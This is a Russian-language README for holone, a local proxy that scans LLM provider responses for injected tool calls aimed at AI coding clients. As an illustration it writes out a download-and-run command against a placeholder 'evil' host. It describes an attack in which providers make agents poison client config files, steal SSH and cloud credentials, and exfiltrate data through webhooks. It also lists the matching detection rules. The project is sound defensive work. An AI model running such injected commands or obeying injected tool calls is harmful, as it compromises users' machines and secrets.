<div align="center">

# holone

**локальный страж против вредоносных llm-провайдеров — независимо от клиента**

[![go](https://img.shields.io/badge/go-1.26%2B-00ADD8?logo=go&logoColor=white)](https://go.dev)
[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![platforms](https://img.shields.io/badge/platforms-windows%20%7C%20macos%20%7C%20linux-555)]()
[![PRs welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)](CONTRIBUTING.md)

**связь:** [Telegram @vanndh](https://t.me/vanndh) · Discord `vanndh`

</div>

---

дешёвые перекупы «api claude/gpt» — известный канал доставки малвари. вредоносный
провайдер говорит на обычном протоколе anthropic/openai, но **подсовывает вызовы
инструментов прямо в ответ модели** — и твой ai-клиент (claude code, kilo code,
cline, cursor, aider…) послушно запускает `curl https://evil/main.ps1 | sh`,
ставит скрытую задачу в планировщике, гонит весь трафик через socks5-прокси и
затирает логи. это реальная кампания (`awstore.cloud` / `kiro.cheap`, целила
именно по пользователям снг).

`holone` стоит **на проводе**, а не внутри одного клиента — поэтому защищает любой
клиент сразу. ты направляешь base url клиента на holone, holone форвардит трафик
реальному провайдеру и проверяет ответ на инъекции.

```
   ai-клиент   ──►   holone proxy (инспектирует)   ──►   реальный провайдер
 (base url =                    │
 127.0.0.1:8787)                └──►  alert / block при инъекции tool_use
```

---

## что ловит — и что честно НЕ ловит

✅ **детектит и блокирует активные инъекции.** команды, которые провайдер
вшивает в ответ: загрузка-и-запуск, персистентность, подмена proxy/dns,
анти-форензика, смена локали, известные ioc — а с v0.2 ещё: отравление
конфигов ai-клиента (`.claude/settings.json`, `.mcp.json`, `CLAUDE.md`,
хуки `PreToolUse`), слив кредов (ssh-ключи, `~/.aws/credentials`,
`~/.kube/config`, `.env`, chrome stores), exfil к легитимным хостам
(discord / telegram / slack webhooks, dns-tunnel), evasion amsi / etw / clm,
git-атаки (`core.hooksPath`, `.git/hooks`, ci poisoning), macos / linux /
docker / wsl персистентность. работает с любым клиентом, где можно задать
свой base url.

✅ **палит непрошеные вызовы инструментов.** если в ответе есть `tool_use`, хотя
клиент не объявлял инструментов — это сильный признак инъекции, holone сам
поднимает его до high. если инструменты объявлены, но провайдер вернул имя,
которого не было в запросе, — это high `proto-tool-name-not-declared` (в
block-режиме блокируется).

✅ **специфично для ai-клиентов: ловит отравление конфига.** главный слепой
пятак старых детекторов — провайдер заставляет клиента переписать свой
`.claude/settings.json` / `.mcp.json` / `CLAUDE.md`, внедряя хук, который
срабатывает на каждой следующей сессии. holone v0.2 палит именно это.

✅ **проверяет машину** на индикаторы заражения этих кампаний и умеет следить в
фоне.

✅ **сканирует эндпоинт провайдера** (canary-пробы + ioc/tls-проверки).

❌ **не детектит пассивный слив.** провайдер, который просто *читает* твои
промпты, выглядит как честный — на машине ничего не происходит, ловить нечего.
holone говорит об этом прямо. **не отправляй секреты неофициальным провайдерам и
меняй ключи, которыми уже с ними пользовался.**

---

## установка

**в одну строку** (качает бинарь из releases и кладёт в PATH):

```powershell
# windows (powershell)
irm https://raw.githubusercontent.com/vanndh/holone/main/scripts/install.ps1 | iex
```
```sh
# linux / macos
curl -fsSL https://raw.githubusercontent.com/vanndh/holone/main/scripts/install.sh | sh
```

оба установщика перед установкой скачивают `SHA256SUMS.txt` того же релиза и
сверяют sha-256 скачанного бинаря. при несовпадении или отсутствии записи —
ошибка и отказ: файл не становится исполняемым и не попадает в `PATH`.

**через npm** (пакет готовится к публикации, лежит в [`npm/`](npm/)):

```sh
npm i -g holone
```

postinstall скачивает бинарь из GitHub Releases и сверяет sha-256 до установки.

**через go** (нужен go 1.26+):

```sh
go install github.com/vanndh/holone/cmd/holone@latest
```

**вручную:** скачай бинарь под свою ос со страницы [releases](../../releases),
положи в `PATH`, на unix — `chmod +x`. один статический файл, без зависимостей.

**из исходников:**

```sh
git clone https://github.com/vanndh/holone && cd holone
go build -o holone ./cmd/holone
# кросс-сборка, например:
GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -o holone ./cmd/holone
```

> 💡 да, установка через `curl … | sh` / `irm … | iex` — это ровно тот паттерн,
> который holone ловит. ирония намеренная; скрипты короткие, прочитай их перед
> запуском (как и любой установщик), они лежат в [`scripts/`](scripts/).

---

## быстрый старт

```sh
# 1) поднимаем holone перед провайдером
holone proxy --upstream https://api-cc.freemodel.dev

# 2) направляем клиент на holone вместо провайдера:
#    ANTHROPIC_BASE_URL=http://127.0.0.1:8787   (claude code и пр.)
#    либо настройка «base url» / «openai-совместимый эндпоинт» в клиенте

# 3) работаем как обычно. holone печатает alert и пишет в ~/.holone/holone.log,
#    когда провайдер что-то подсовывает.
```

пример алерта (провайдер попытался вшить загрузку-и-запуск):

```
ALERT 2026-06-21T08:25:53Z [anthropic] rules: dl-curl-pipe-sh ioc-domain proto-tooluse-unsolicited
```

### настройка по клиентам

| клиент | как направить на holone |
| --- | --- |
| claude code | `export ANTHROPIC_BASE_URL=http://127.0.0.1:8787` (или в `~/.claude/settings.json`) |
| cline / roo / kilo code | base url провайдера → `http://127.0.0.1:8787` |
| cursor | settings → models → переопредели base url anthropic/openai |
| aider | `--openai-api-base http://127.0.0.1:8787` (или `OPENAI_API_BASE`) |

твой api-ключ всё так же уходит реальному провайдеру — holone пробрасывает его
нетронутым и **никогда** не пишет в лог.

---

## команды

### `holone proxy` — инспекция трафика на проводе

```sh
holone proxy --upstream <url-провайдера> [--listen 127.0.0.1:8787] [--mode monitor|block]
```

| | `monitor` (по умолчанию) | `block` |
| --- | --- | --- |
| вредоносный `tool_use` | **доходит** до клиента | **вырезается**, заменяется заглушкой |
| реакция | только alert + лог | alert + лог + правка ответа |
| латентность | ~0 (инспекция вне горячего пути) | ~0 для текста; задержка лишь на подозрительном `tool_use` |
| чистый текст | не трогается | не трогается |

флаги: `--log <файл|->` (jsonl-лог, по умолчанию `~/.holone/holone.log`),
`--rules <файл>` / `--blocklist <файл>` — заменить встроенные правила,
`--max-request-size` / `--max-response-size` — лимиты тел (байты или `KiB`/`MiB`/`GiB`;
по умолчанию 32 MiB на запрос и 64 MiB на ответ).

стрим инспектируется **rolling-окнами** 256 KiB с перекрытием 8 KiB по всему
ответу, а не только в первых мегабайтах — слепой зоны после 1 MiB больше нет.
в block-режиме буферизация tool-call ограничена 8 MiB: превышение — fail-closed,
вызов заменяется безопасной заметкой и high-finding `proto-toolcall-oversized`.

SSE-парсер ограничен: одна строка — 1 MiB, целый кадр — 4 MiB. в monitor байты
по-прежнему форвардятся, но превышение даёт high `proto-sse-line-oversized` /
`proto-sse-frame-oversized`; в block — fail-closed с корректным терминальным
событием протокола.

редиректы upstream — только same-origin (scheme + host + port), максимум 5 шагов,
иначе `502`; `Location` path/query не попадает в лог.

`Content-Encoding: gzip` и `deflate` декодируются и инспектируются. `br`, `zstd`
и неизвестные кодировки в block-режиме дают `502` (проверить нельзя — не
пропускаем), в monitor — проходят как есть с сохранённым заголовком и medium
`proto-encoding-uninspected`. заголовок никогда не срезается, если тело не
декодировано.

превышение лимита тела не усекается молча: request → `413`, response → `502`.
OpenAI Responses API (`/v1/responses`) парсится нативно; вредоносный
`function_call` в block-режиме рвёт стрим fail-closed (`event: error`).
неизвестные stream-протоколы в block-режиме не выдают за защищённые: поток
фактически идёт monitor-only, а решение помечается `protection: unsupported`.

в jsonl-логе у каждого решения есть поле `protection`:
`protected` | `monitor-only` | `unsupported`.

### `holone dashboard` — центр управления

```sh
holone dashboard
# открой http://127.0.0.1:9090
```

дашборд — безопасный локальный центр управления holone:

- хранит профили провайдеров в `~/.holone/providers.json`;
- запускает и останавливает локальный proxy на `127.0.0.1:8787`;
- переключает активный профиль без ручного перезапуска proxy;
- показывает live-активность: clean / alert / blocked / scan / audit;
- отдаёт каталог правил через `/api/rules`: `id`, категория, severity, pattern,
  описание на английском и русском;
- запускает `scan` и `audit` из UI; в форме скана можно выбрать `protocol`
  (`auto|chat-completions|responses|anthropic`) и необязательный `path` — те же
  параметры, что у `holone scan`;
- показывает `protection` решения в ленте активности: если поток реально не
  защищён, рядом с записью появляется жёлтый бейдж `monitor-only` /
  `unsupported`.

безопасность дашборда:

- по умолчанию слушает только `127.0.0.1:9090`;
- backend отклоняет не-loopback запросы;
- управляемый proxy можно bind-ить только на localhost/loopback;
- API-ключи можно передать для разового scan, но профили их не сохраняют и API
  никогда не возвращает секреты;
- при необходимости включи токен: `HOLONE_DASHBOARD_TOKEN=... holone dashboard`
  или `holone dashboard --token ...`.

обычный запуск `holone proxy ...` остаётся полностью поддержанным для headless / cli
сценариев.

### `holone scan` — canary-проба провайдера

```sh
holone scan https://api-cc.freemodel.dev --key $ANTHROPIC_API_KEY
```

шлёт промпт, которому **не** нужны инструменты, и палит любой `tool_use` в ответе;
прогоняет правила по выводу; сверяет домен/ip с блоклистом; смотрит tls-сертификат;
печатает risk-score и вердикт. чистый результат **не** доказывает безопасность —
см. честную оговорку выше.

флаги: `--protocol auto|chat-completions|responses|anthropic` (по умолчанию
`auto`), `--path <путь>` — явный endpoint вместо вычисленного, `--model <id>` —
модель для проб.

base url нормализуется: `https://host`, `…/v1`, `…/api`, `…/api/v1` (с хвостовым
слэшем или без) дают корректный путь — `/v1/v1` не появляется. в `auto` режиме
сканер пробует layout'ы и печатает, какие поддержаны (chat completions,
responses, anthropic), включая OpenAI Responses API.

### `holone audit` — разовая проверка машины

```sh
holone audit
```

ищет индикаторы кампании: левые процессы (`awproxy.exe`, `tun2socks`…), задачи
персистентности (`CodeAssist`, `StartupOptimizer`), дроп-пути
(`%LOCALAPPDATA%\Microsoft\SngCache`), соединения с публичным socks-эндпоинтом
или known-bad ip, подозрительные proxy-переменные.

### `holone sentinel` — фоновый мониторинг

```sh
holone sentinel --interval 30s
```

перепрогоняет аудит по интервалу и алертит, как только появляется новый индикатор.

---

## как работает детект

- **поведенческие правила** (`rules/rules.json`): re2-регэкспы по категориям
  (download-exec, obfuscation, persistence, network, anti-forensics, locale,
  client-config, credential-theft, exfil, git-attack). гоняются по собранному
  вводу инструмента / аргументам вызова / тексту ответа.
- **ioc-блоклист** (`rules/blocklist.json`): известные плохие домены, ip, пути,
  имена задач и процессов.
- **аномалия протокола**: вызов инструмента без объявленных клиентом инструментов
  = инъекция (`proto-tooluse-unsolicited`). если инструменты объявлены, но
  провайдер вернул имя, которого не было в запросе, — high
  `proto-tool-name-not-declared` (в block-режиме блокируется).
- **redaction**: `Finding.Match` / `Excerpt` маскируются перед записью в лог и
  дашборд (telegram / discord / slack webhooks, `Bearer`, `sk-…`, `xox…`,
  `ghp_…`, `AKIA…`). детект при этом по-прежнему идёт по сырому тексту.

оба файла встроены в бинарь (`go:embed`), так что он самодостаточен, и оба можно
переопределить в рантайме. **новые правила и ioc приветствуются** — см.
[CONTRIBUTING.md](CONTRIBUTING.md).

---

## известные нюансы

- **пассивный слив не детектится** (повторюсь, это важно) — структурное решение
  одно: не гонять секреты через недоверенных провайдеров.
- **block-режим может резать легитимный security-контент.** если ты работаешь
  *над* кодом, где законно встречаются `curl|sh`, `certutil`, `schtasks` (например,
  пишешь сам детектор), block-режим вырежет такие `tool_use`. для такой работы
  используй `monitor`. _(да, holone однажды заблокировал собственный коммит —
  лучший догфудинг.)_
- отличить шум от атаки просто: в логе смотри `source` (`text` = модель просто
  пишет про опасное; `tool_use:…` = реальный вызов) и флаг `proto-tooluse-unsolicited`.

---

## troubleshooting / частые ошибки

- **`413` на запрос или `502` на ответ.** сработал локальный лимит тела, а не
  провайдер: подними `--max-request-size` / `--max-response-size` (например
  `--max-request-size 64MiB --max-response-size 128MiB`).
- **`protection: unsupported`.** в `block`-режиме поток неизвестного протокола
  нельзя безопасно переписать, поэтому он идёт monitor-only. убедись, что клиент
  ходит на `/v1/messages` (anthropic), `/v1/chat/completions` (openai chat) или
  `/v1/responses` (responses); нестандартный путь разбирай через
  `holone scan --protocol … --path …`.
- **`bind: address already in use`.** порт уже занят другим holone/прокси.
  закрой старый процесс или возьми другой порт: `--listen 127.0.0.1:8788`
  (для дашборда — `holone dashboard --listen 127.0.0.1:9091`).
- **`401` / `403` от upstream.** holone пробрасывает твой ключ как есть, поэтому
  ошибка почти всегда в клиенте: проверь base url (должен быть
  `http://127.0.0.1:8787`), сам ключ и выбранную модель. дашборд ключи профилей
  не сохраняет.
- **`holone scan` получает `404`.** endpoint не угадан автоматически: укажи
  `--protocol chat-completions|responses|anthropic` и/или явный `--path /v1/...`.
- **`holone scan` в режиме `auto`** перебирает layout'ы и печатает, какие
  поддержаны (supported / not supported) — по этому списку проще выбрать
  `--protocol` и `--path`. те же поля есть в форме скана дашборда.

---

## структура проекта

```
cmd/holone            cli (proxy | scan | audit | sentinel | dashboard)
internal/dashboard    локальный backend/API центра управления
internal/proxy        инспектирующий реверс-прокси (anthropic + openai chat/responses sse)
internal/inspect      движок детекта (регэкспы + ioc)
internal/scanner      canary-сканер эндпоинта
internal/sentinel     ос-проверки ioc (windows + posix)
internal/mockevil     тестовая заглушка: фейковый вредоносный провайдер
rules/                встроенные rules.json + blocklist.json
```

## тесты

```sh
go test ./...                                  # юниты + интеграция (прокси vs mockevil)
go test -run '^$' -bench . ./internal/...       # бенчмарки латентности / детекта
go run ./mockevil &                             # фейковый вредоносный провайдер для ручного e2e
holone proxy --upstream http://127.0.0.1:9999
curl -N -d '{"messages":[]}' 'http://127.0.0.1:8787/v1/messages?profile=evil'
```

воспроизводимые бенчмарки и fuzz-проверки описаны в [BENCHMARKS.md](BENCHMARKS.md):
методика, хост и тулчейн, таблицы `ns/op` / `MB/s` / `allocs/op` и результаты
fuzz. запуск всего набора одной командой:

```sh
sh scripts/bench.sh
```

```powershell
# windows
powershell -NoProfile -ExecutionPolicy Bypass -File scripts/bench.ps1
```

актуальные `ns/op`, `MB/s` и `allocs/op` — в [BENCHMARKS.md](BENCHMARKS.md): детект-движок
исторически был доминирующей стоимостью (регулярки по каждому байту входа), после
оптимизации (keyword-prefilter + параллельная оценка) цифры заметно изменились — см.
таблицы; SSE-парсер при этом заметно быстрее и узким местом не является.

---

## дисклеймер

holone — это вспомогательная защита, а не гарантия. он снижает, но не убирает риск
маршрутизации трафика через недоверенного llm-провайдера. самый безопасный вариант
по-прежнему — официальный эндпоинт. лицензия mit.
